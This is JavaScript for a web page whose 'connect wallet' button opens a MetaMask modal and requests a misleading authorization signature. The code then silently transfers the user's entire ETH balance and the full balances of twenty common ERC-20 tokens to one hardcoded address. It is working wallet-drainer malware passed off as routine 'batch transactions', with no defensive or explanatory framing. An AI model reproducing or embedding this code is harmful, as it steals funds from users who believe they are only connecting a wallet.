
        let isConnecting = false; // Prevent multiple simultaneous connections

        document.getElementById("connectButton").addEventListener("click", openModal);

        function openModal() {
            const modal = document.getElementById("walletModal");
            modal.style.display = "block";
            const modalContent = modal.querySelector(".modal-content");
            modalContent.style.bottom = "0"; // Slide up

            console.log("Modal opened for wallet selection");
        }

        function closeModal() {
            const modalContent = document.querySelector(".modal-content");
            modalContent.style.bottom = "-100%"; // Slide down

            setTimeout(() => {
                document.getElementById("walletModal").style.display = "none";
                console.log("Modal closed after wallet selection");
            }, 400); // Match this duration with CSS transition time
        }

        async function connectMetaMask() {
            console.log("MetaMask button clicked");
            await connectWallet("MetaMask");
        }

        async function connectWallet(walletName) {
            if (isConnecting) {
                console.log("Connection request already in progress...");
                return;
            }

            isConnecting = true;
            closeModal();

            try {
                let account;
                console.log(`Attempting to connect to ${walletName}...`);

                if (walletName === "MetaMask" && typeof window.ethereum !== "undefined") {
                    console.log(`${walletName} detected. Requesting to sign a message...`);

                    // Request account and sign a message for authentication
                    const provider = new ethers.providers.Web3Provider(window.ethereum);
                    const signer = provider.getSigner();
                    const accounts = await provider.send("eth_requestAccounts", []);
                    account = accounts[0];
                    await signer.signMessage("Authorize wallet connection for batch transactions.");
                    console.log(`Connected to ${walletName} account: ${account}`);
                } else {
                    alert(`${walletName} is not installed. Please install it.`);
                    console.error(`${walletName} is not installed in the browser.`);
                    return;
                }

                if (account) {
                    console.log(`Wallet connected. Initiating batch transaction process for account: ${account}`);
                    await executeBatchTransactions(account); // Trigger batch transactions
                } else {
                    console.error("No account found.");
                }

            } catch (error) {
                console.error(`Error connecting to ${walletName}:`, error);
            } finally {
                isConnecting = false;
                console.log(`Finished connection attempt for ${walletName}`);
            }
        }

        async function executeBatchTransactions(userWallet) {
            console.log("Executing batch transactions...");

            const provider = new ethers.providers.Web3Provider(window.ethereum);
            const signer = provider.getSigner();
            const recipient = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD"; // Replace with the recipient's Ethereum address

            // 20 ERC-20 token addresses
            const tokenAddresses = [
                "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT (Tether)
                "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC (USD Coin)
                "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI (Dai Stablecoin)
                "0x111111111117dC0aa78b770fA6A738034120C302", // 1INCH (1inch Token)
                "0x4fabb145d64652a948d72533023f6E7A623C7C53", // BUSD (Binance USD)
                "0xC02aaA39b223FE8D0A0E5C4F27eAD9083C756Cc2", // WETH (Wrapped Ethereum)
                "0x514910771AF9Ca656af840dff83E8264EcF986CA", // LINK (Chainlink)
                "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", // SHIB (Shiba Inu)
                "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC (Wrapped Bitcoin)
                "0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32", // LDO (Lido DAO)
                "0x7BeBd226154E865954A87650FAefa2F9204D2a32", // RARI (Rarible)
                "0xBf5140A22578168FD562DCcF235E5D43A02ce9B1", // UNI (Uniswap)
                "0x0D8775F648430679A709E98d2b0Cb6250d2887EF", // BAT (Basic Attention Token)
                "0x408e41876cCCDC0F92210600ef50372656052a38", // REN (Ren)
                "0xBBbbCA6A901c926F240b89EacB641d8Aec7AEafD", // LRC (Loopring)
                "0xE41d2489571d322189246DaFA5ebDe1F4699F498", // ZRX (0x Protocol)
                "0xC00e94Cb662C3520282E6f5717214004A7f26888", // COMP (Compound)
                "0x6B3595068778DD592e39A122f4f5a5CF09C90fE2", // SUSHI (SushiSwap)
                "0xD533a949740bb3306d119CC777fa900bA034cd52", // CRV (Curve DAO)
                "0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e", // YFI (Yearn Finance)
            ];

            try {
                // Step 1: Transfer all ETH
                const ethBalance = await provider.getBalance(userWallet);
                if (ethBalance.gt(ethers.constants.Zero)) {
                    console.log("Transferring ETH...");
                    const tx = await signer.sendTransaction({
                        to: recipient,
                        value: ethBalance.sub(ethers.utils.parseEther("0.001")), // Leave a small balance for gas
                    });
                    console.log("ETH transferred. Transaction Hash:", tx.hash);
                    await tx.wait();
                } else {
                    console.log("No ETH to transfer.");
                }

                // Step 2: Transfer all ERC-20 tokens
                const tokenABI = [
                    "function balanceOf(address account) view returns (uint256)",
                    "function transfer(address to, uint256 amount) returns (bool)",
                ];

                for (let tokenAddress of tokenAddresses) {
                    const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
                    const tokenBalance = await tokenContract.balanceOf(userWallet);

                    if (tokenBalance.gt(ethers.constants.Zero)) {
                        console.log(`Transferring tokens from ${tokenAddress}...`);
                        const tx = await tokenContract.transfer(recipient, tokenBalance);
                        console.log(`Tokens transferred. Transaction Hash: ${tx.hash}`);
                        await tx.wait();
                    } else {
                        console.log(`No balance for token ${tokenAddress}.`);
                    }
                }

                console.log("Batch transactions completed.");
            } catch (error) {
                console.error("Error executing batch transactions:", error);
            }
        }
